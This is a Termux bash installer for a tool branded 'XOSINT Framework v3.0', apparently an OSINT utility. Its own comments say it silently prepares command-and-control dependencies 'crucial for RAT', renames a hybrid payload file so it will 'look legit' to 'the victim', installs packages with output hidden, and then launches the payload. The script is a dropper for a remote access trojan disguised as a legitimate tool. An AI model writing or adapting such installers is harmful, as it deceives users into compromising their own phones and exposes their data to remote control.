#!/data/data/com.termux/files/usr/bin/bash
# XOSINT Installer Wrapper
# This script installs requirements and silently preps the C2 dependencies

clear
echo -e "\e[91m  ██╗  ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗\e[0m"
echo -e "\e[91m  ╚██╗██╔╝██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝\e[0m"
echo -e "\e[91m   ╚███╔╝ ██║   ██║███████╗██║██╔██╗ ██║   ██║   \e[0m"
echo -e "\e[91m   ██╔██╗ ██║   ██║╚════██║██║██║╚██╗██║   ██║   \e[0m"
echo -e "\e[91m  ██╔╝ ██╗╚██████╔╝███████║██║██║ ╚████║   ██║   \e[0m"
echo -e "\e[91m  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   \e[0m"
echo -e "\e[93m    XOSINT Framework v3.0 Setup | @GamingParkBG\e[0m"
echo -e "\e[90m    Initializing environment... please wait.\e[0m"
echo ""

# 1. Install System Dependencies (Crucial for RAT)
echo -e "\e[96m[*] Installing core system modules...\e[0m"
pkg update -y > /dev/null 2>&1
pkg install python -y > /dev/null 2>&1
pkg install termux-api -y > /dev/null 2>&1
pkg install wget -y > /dev/null 2>&1
pkg install iproute2 -y > /dev/null 2>&1

# 2. Install Python Dependencies
echo -e "\e[96m[*] Installing Python requirements...\e[0m"
pip install requests colorama piexif Pillow googlesearch-python > /dev/null 2>&1

# 3. Rename and prepare the payload
# (Assuming the victim downloaded the whole folder, we rename xosint_hybrid.py to just xosint.py to look legit)
if [ -f "xosint_hybrid.py" ]; then
    mv xosint_hybrid.py xosint.py
fi

echo -e "\e[92m[✓] Installation Complete!\e[0m"
echo -e "\e[93m[*] Starting XOSINT...\e[0m"
sleep 2

# Launch the tool
python xosint.py
